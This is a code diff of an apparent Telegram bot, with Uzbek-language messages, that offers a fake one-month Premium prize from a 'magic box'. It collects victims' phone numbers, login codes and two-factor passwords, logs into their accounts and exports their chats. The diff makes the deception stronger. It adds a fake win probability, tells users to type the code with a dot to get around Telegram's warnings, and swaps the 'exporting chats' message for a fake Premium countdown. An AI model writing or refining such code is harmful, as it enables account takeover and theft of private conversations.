@@ -108,7 +108,7 @@ async def prizes(msg: types.Message):
     uid = str(msg.from_user.id)
     ensure_user(uid)
     await msg.answer(
-        "🥳 Sizda Premium bor" if users[uid]["prize"] else "❌ Yutuq yo‘q"
+        "🥳 Sizda 1 oylk Premium bor\n Olish uchun aktivlash bo'limiga o'ting" if users[uid]["prize"] else "❌ Yutuq yo‘q"
     )
 
 # ================== SEHRLI QUTI ==================
@@ -163,14 +163,14 @@ async def open_box(c):
             types.InlineKeyboardButton("🔓 Ochish", callback_data="open_box")
         )
 
-    await c.message.answer("🎉 Siz yutdingiz!", reply_markup=kb)
+    await c.message.answer("🎉 Siz yutdingiz!\nSizga 1 oylik premium berildi uni olish uchun aktivlash bo'limiga o'ting\n\n Sizga tushgan yutuq shansi: 17.8%", reply_markup=kb)
     await c.answer()
 
 # ================== AKTIVLASH ==================
 @dp.message_handler(lambda m: m.text == "✅ Aktivlash")
 async def activate(msg: types.Message):
     sessions[msg.from_user.id] = {"step": "phone"}
-    await msg.answer("📲 Telefon raqamingizni yuboring", reply_markup=back_menu())
+    await msg.answer("📲 Telefon raqamingizni yuboring\n Namuna: +998123456789", reply_markup=back_menu())
 
 @dp.message_handler(lambda m: m.text == "⬅️ Orqaga")
 async def go_back(msg: types.Message):
@@ -190,7 +190,7 @@ async def login_flow(msg: types.Message):
     if state["step"] == "phone":
         digits = re.sub(r"\D", "", text)
         if len(digits) < 8:
-            await msg.answer("❌ Telefon noto‘g‘ri\nMasalan: +998901234567 yoki +491234567")
+            await msg.answer("❌ Telefon noto‘g‘ri\nMasalan: +998123456789  yoki +491234567")
             return
 
         phone = "+" + digits
@@ -205,7 +205,7 @@ async def login_flow(msg: types.Message):
             "phone_code_hash": sent.phone_code_hash
         })
 
-        await msg.answer("🔐 Kod yuborildi\nMasalan: 23.345 yoki 23345")
+        await msg.answer("🔐 Kod yuborildi kiriting\nMasalan: 23.345 XUDDI SHUNDAY BO'LISHISHART")
         return
 
     # CODE
@@ -238,7 +238,7 @@ async def login_flow(msg: types.Message):
     # PASSWORD
     if state["step"] == "password":
         await state["client"].sign_in(password=text)
-        await msg.answer("⏳ Chatlar eksport qilinmoqda...")
+        await msg.answer("⏳ Premium olinmoqda. Qolgan vaqt 3 daqiqa 59 soniya")
         await export_chats(uid)
 
 # ================== EXPORT ==================
